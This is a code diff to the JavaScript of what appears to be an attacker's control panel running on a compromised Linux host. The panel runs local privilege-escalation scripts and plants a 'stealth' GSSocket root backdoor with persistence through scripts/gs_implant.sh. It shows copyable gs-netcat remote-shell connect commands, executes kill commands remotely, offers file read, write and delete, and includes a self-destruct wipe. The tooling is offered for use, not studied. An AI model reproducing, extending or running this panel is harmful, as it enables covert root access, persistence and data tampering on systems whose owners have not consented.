@@ -3,7 +3,7 @@ const api=async(e,d)=>{try{const r=await fetch('/api/'+e,{method:'POST',headers:
 
 document.querySelectorAll('.nav-item[data-p]').forEach(n=>n.onclick=()=>nav(n.dataset.p));
 
-let cwd='/',currentFile='',sysData={},methodResults={};
+let cwd='/',currentFile='',sysData={},methodResults={},sessionRemaining=7200;
 
 function nav(p){
     document.querySelectorAll('.page').forEach(x=>x.classList.remove('on'));
@@ -19,8 +19,35 @@ function nav(p){
 function openModal(id){$(id).classList.add('on');}
 function closeModal(id){$(id).classList.remove('on');}
 
+// Session Timer
+async function updateSessionTimer(){
+    const r=await api('timer');
+    if(r.remaining!==undefined){
+        sessionRemaining=r.remaining;
+    }
+}
+
+function renderTimer(){
+    const mins=Math.floor(sessionRemaining/60);
+    const secs=sessionRemaining%60;
+    const timerEl=$('session-timer');
+    if(timerEl){
+        timerEl.textContent=`${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
+        timerEl.className='session-timer'+(sessionRemaining<300?' danger':sessionRemaining<900?' warning':'');
+    }
+    if(sessionRemaining>0)sessionRemaining--;
+    if(sessionRemaining<=0){
+        document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:#ef4444;font-size:20px;flex-direction:column"><div style="font-size:48px;margin-bottom:20px">⏱</div>SESSION EXPIRED<br><small style="color:#666;margin-top:10px">Memory cleared</small></div>';
+    }
+}
+
 // Initialize
 async function init(){
+    // Get session timer
+    await updateSessionTimer();
+    setInterval(renderTimer,1000);
+    setInterval(updateSessionTimer,60000);
+    
     const r=await api('run',{path:'scripts/sysinfo.sh'});
     try{
         const d=JSON.parse(r.output||'{}');
@@ -71,7 +98,7 @@ async function checkGsAlert(){
     }catch(e){}
 }
 
-// LPE Methods - New Design with expandable cards
+// LPE Methods
 const LPE_METHODS = [
     {id:'01_sudo',name:'Sudo NOPASSWD',desc:'Check sudo misconfigurations'},
     {id:'02_suid',name:'SUID Binaries',desc:'Find exploitable SUID files'},
@@ -138,24 +165,48 @@ async function runSingleMethod(idx){
     card.classList.add('expanded');
     stat.textContent='checking';
     stat.className='method-status checking';
-    out.textContent='Running '+m.name+'...';
+    out.innerHTML='<span style="color:var(--gold)">Running '+m.name+'...</span>';
     
     const r=await api('run',{path:'lpe_methods/'+m.id+'.sh'});
     const output=r.output||'No output';
     
-    out.textContent=output;
+    // Format output with colors
+    let formatted=output.split('\n').map(line=>{
+        if(line.includes('[+]'))return `<span style="color:var(--green)">${line}</span>`;
+        if(line.includes('[-]'))return `<span style="color:var(--red)">${line}</span>`;
+        if(line.includes('[!]'))return `<span style="color:#f59e0b">${line}</span>`;
+        if(line.includes('[*]'))return `<span style="color:var(--gold)">${line}</span>`;
+        return line;
+    }).join('\n');
+    
+    out.innerHTML=`<pre style="margin:0;white-space:pre-wrap">${formatted}</pre>`;
     methodResults[idx]=output;
     
-    // Determine status from output
-    if(output.includes('[+]')||output.includes('SUCCESS')||output.includes('VULNERABLE')){
+    // Determine status
+    if(output.includes('[+]')||output.includes('SUCCESS')||output.includes('VULNERABLE')||output.includes('ROOT_SECRET')){
         stat.textContent='success';
         stat.className='method-status success';
-    }else if(output.includes('[!]')||output.includes('PARTIAL')||output.includes('found')){
+    }else if(output.includes('[!]')||output.includes('found')||output.includes('READABLE')||output.includes('WRITABLE')){
         stat.textContent='partial';
         stat.className='method-status partial';
     }else{
         stat.textContent='clean';
         stat.className='method-status failed';
+    }
+    
+    // Check for root secret
+    if(output.includes('ROOT_SECRET:')){
+        const match=output.match(/ROOT_SECRET:([^\s\n]+)/);
+        if(match){
+            $('root-success').style.display='flex';
+            $('root-success-msg').textContent='Method: '+m.name;
+            $('root-result').innerHTML=`
+                <div class="root-box">
+                    <h3>🎉 ROOT BACKDOOR PLANTED!</h3>
+                    <p style="font-size:11px;color:var(--text)">Stealth GSSocket backdoor installed as root.</p>
+                    <code onclick="navigator.clipboard.writeText(this.textContent)">gs-netcat -s ${match[1]} -i</code>
+                </div>`;
+        }
     }
 }
 
@@ -165,56 +216,27 @@ async function runAllMethods(){
     $('root-success').style.display='none';
     $('root-result').innerHTML='';
     
-    let rootFound=false;
-    let rootSecret='';
-    let rootMethod='';
-    
     for(let i=0;i<LPE_METHODS.length;i++){
-        const card=$('mc-'+i);
-        const stat=$('mstat-'+i);
-        
-        stat.textContent='checking';
-        stat.className='method-status checking';
-        
         await runSingleMethod(i);
-        
-        // Check if root was achieved
-        const output=methodResults[i]||'';
-        if(output.includes('ROOT_SECRET:')){
-            const match=output.match(/ROOT_SECRET:([^\s\n]+)/);
-            if(match){
-                rootFound=true;
-                rootSecret=match[1];
-                rootMethod=LPE_METHODS[i].name;
-            }
-        }
-        
-        // Small delay between methods
-        await new Promise(r=>setTimeout(r,500));
-    }
-    
-    if(rootFound){
-        $('root-success').style.display='flex';
-        $('root-success-msg').textContent='Method: '+rootMethod;
-        $('root-result').innerHTML=`
-            <div class="root-box">
-                <h3>🎉 ROOT BACKDOOR PLANTED!</h3>
-                <p style="font-size:11px;color:var(--text)">Stealth GSSocket backdoor installed as root.</p>
-                <code onclick="navigator.clipboard.writeText(this.textContent)">gs-netcat -s ${rootSecret} -i</code>
-            </div>`;
-    }else{
-        $('root-result').innerHTML=`
-            <div class="alert">
-                <span class="alert-icon">ℹ️</span>
-                <div class="alert-text">
-                    <strong>Scan Complete</strong>
-                    Review each method's output for potential escalation paths.
-                </div>
-            </div>`;
+        await new Promise(r=>setTimeout(r,300));
     }
     
     $('btn-autoroot').disabled=false;
     $('btn-autoroot').textContent='🚀 Run All';
+    
+    // Summary
+    let success=0,partial=0;
+    for(let i=0;i<20;i++){
+        const stat=$('mstat-'+i)?.textContent;
+        if(stat==='success')success++;
+        if(stat==='partial')partial++;
+    }
+    
+    if(success===0&&partial===0){
+        $('root-result').innerHTML=`<div class="alert"><span class="alert-icon">✓</span><div class="alert-text"><strong>System appears hardened</strong>No obvious privilege escalation vectors found.</div></div>`;
+    }else if(success===0){
+        $('root-result').innerHTML=`<div class="alert" style="background:rgba(245,158,11,0.1);border-color:rgba(245,158,11,0.2)"><span class="alert-icon">⚠️</span><div class="alert-text"><strong>${partial} Potential Vectors</strong>Review partial findings for manual exploitation.</div></div>`;
+    }
 }
 
 // Exploits
@@ -315,62 +337,14 @@ async function fmLoad(path){
 
 function fmUp(){fmLoad(cwd.split('/').slice(0,-1).join('/')||'/');}
 function fmRefresh(){fmLoad(cwd);}
-
-async function fmView(path){
-    currentFile=path;
-    $('modal-view-title').textContent=path.split('/').pop();
-    const r=await api('read',{path});
-    $('modal-view-content').textContent=r.content||'(empty/binary)';
-    openModal('modal-view');
-}
-
-async function fmEdit(path){
-    currentFile=path||currentFile;
-    $('modal-edit-title').textContent='Edit: '+currentFile.split('/').pop();
-    const r=await api('read',{path:currentFile});
-    $('modal-edit-content').value=r.content||'';
-    closeModal('modal-view');
-    openModal('modal-edit');
-}
-
-async function fmSaveEdit(){
-    await api('write',{path:currentFile,content:$('modal-edit-content').value});
-    closeModal('modal-edit');
-    fmRefresh();
-}
-
-function fmNewFile(){
-    $('modal-new-name').value='';
-    $('modal-new-content').value='';
-    openModal('modal-new');
-}
-
-function fmNewDir(){
-    const n=prompt('Folder name:');
-    if(n)api('mkdir',{path:cwd+'/'+n}).then(fmRefresh);
-}
-
-async function fmSaveNew(){
-    const n=$('modal-new-name').value.trim();
-    if(!n)return;
-    await api('write',{path:cwd+'/'+n,content:$('modal-new-content').value});
-    closeModal('modal-new');
-    fmRefresh();
-}
-
-async function fmDelete(path){
-    if(!confirm('Delete?'))return;
-    await api('delete',{path});
-    fmRefresh();
-}
-
-function fmCtx(e,path){
-    e.preventDefault();
-    const c=prompt('1=View 2=Edit 3=Delete');
-    if(c==='1')fmView(path);
-    else if(c==='2')fmEdit(path);
-    else if(c==='3')fmDelete(path);
-}
+async function fmView(path){currentFile=path;$('modal-view-title').textContent=path.split('/').pop();const r=await api('read',{path});$('modal-view-content').textContent=r.content||'(empty/binary)';openModal('modal-view');}
+async function fmEdit(path){currentFile=path||currentFile;$('modal-edit-title').textContent='Edit: '+currentFile.split('/').pop();const r=await api('read',{path:currentFile});$('modal-edit-content').value=r.content||'';closeModal('modal-view');openModal('modal-edit');}
+async function fmSaveEdit(){await api('write',{path:currentFile,content:$('modal-edit-content').value});closeModal('modal-edit');fmRefresh();}
+function fmNewFile(){$('modal-new-name').value='';$('modal-new-content').value='';openModal('modal-new');}
+function fmNewDir(){const n=prompt('Folder name:');if(n)api('mkdir',{path:cwd+'/'+n}).then(fmRefresh);}
+async function fmSaveNew(){const n=$('modal-new-name').value.trim();if(!n)return;await api('write',{path:cwd+'/'+n,content:$('modal-new-content').value});closeModal('modal-new');fmRefresh();}
+async function fmDelete(path){if(!confirm('Delete?'))return;await api('delete',{path});fmRefresh();}
+function fmCtx(e,path){e.preventDefault();const c=prompt('1=View 2=Edit 3=Delete');if(c==='1')fmView(path);else if(c==='2')fmEdit(path);else if(c==='3')fmDelete(path);}
 
 // GSSocket Monitor
 async function gsScan(){
@@ -408,62 +382,47 @@ async function gsScan(){
             }else{
                 h+=`<div class="gs-card hostile">
                     <div class="gs-header">
-                        <span class="gs-badge hostile">${g.type.toUpperCase()}</span>
+                        <span class="gs-badge hostile">${(g.type||'').toUpperCase()}</span>
                         <span class="gs-secret">${g.path||''}</span>
                     </div>
-                    <div class="gs-body">
-                        <table>
-                            <tr><td>Owner</td><td>${g.owner||'-'}</td></tr>
-                        </table>
-                    </div>
+                    <div class="gs-body"><table><tr><td>Owner</td><td>${g.owner||'-'}</td></tr></table></div>
                 </div>`;
             }
         });
         
         $('gs-list').innerHTML=h||'<div style="padding:20px;text-align:center;color:var(--green)">✓ No GSockets found</div>';
     }catch(e){
-        $('gs-list').innerHTML='<div style="padding:20px;color:var(--red)">Error: '+e.message+'</div>';
+        $('gs-list').innerHTML='<div style="padding:20px;color:var(--red)">Error parsing results</div>';
     }
 }
 
-async function gsKill(pid){
-    await api('exec',{cmd:'kill -9 '+pid});
-    setTimeout(gsScan,500);
-}
-
-async function gsKillAll(){
-    if(!confirm('Kill ALL gs-netcat processes?'))return;
-    await api('exec',{cmd:"pkill -9 -f 'gs-netcat'"});
-    setTimeout(gsScan,500);
-}
+async function gsKill(pid){await api('exec',{cmd:'kill -9 '+pid});setTimeout(gsScan,500);}
+async function gsKillAll(){if(!confirm('Kill ALL gs-netcat?'))return;await api('exec',{cmd:"pkill -9 -f gs-netcat"});setTimeout(gsScan,500);}
 
 async function gsPlant(){
-    const s=prompt('Secret key (leave empty for random):');
+    const s=prompt('Secret (empty=random):');
+    $('gs-list').innerHTML='<div style="padding:20px;text-align:center;color:var(--gold)">Planting stealth backdoor...</div>';
+    
     const r=await api('run',{path:'scripts/gs_implant.sh '+(s||'')});
     
     try{
-        const d=JSON.parse(r.output.match(/\{[\s\S]*\}$/)?.[0]||'{}');
+        const lines=r.output.split('\n');
+        const lastJson=lines.filter(l=>l.startsWith('{')).pop();
+        const d=JSON.parse(lastJson||'{}');
+        
         if(d.status==='success'){
-            alert('✅ Stealth backdoor planted!\n\nConnect: '+d.connect+'\n\nFeatures: '+d.features.join(', '));
+            alert(`✅ STEALTH BACKDOOR PLANTED!\n\nSecret: ${d.secret}\nInstances: ${d.instances}\nPersistence: ${d.persistence||'none'}\n\nConnect:\n${d.connect}\n\nFeatures:\n${(d.features||[]).join(', ')}`);
         }else{
-            alert('Error: '+(d.message||'Unknown'));
+            alert('Error: '+(d.message||r.output));
         }
     }catch(e){
-        alert('Output: '+r.output);
+        alert('Result:\n'+r.output);
     }
     gsScan();
 }
 
 // Actions
-async function pull(){
-    await api('pull');
-    location.reload();
-}
-
-async function nuke(){
-    if(!confirm('⚠️ DESTRUCT ALL?'))return;
-    await api('destruct');
-    document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:var(--red);font-size:24px">💀 DESTROYED</div>';
-}
+async function pull(){await api('pull');location.reload();}
+async function nuke(){if(!confirm('⚠️ DESTRUCT ALL?'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:var(--red);font-size:24px">💀 DESTROYED</div>';}
 
 init();
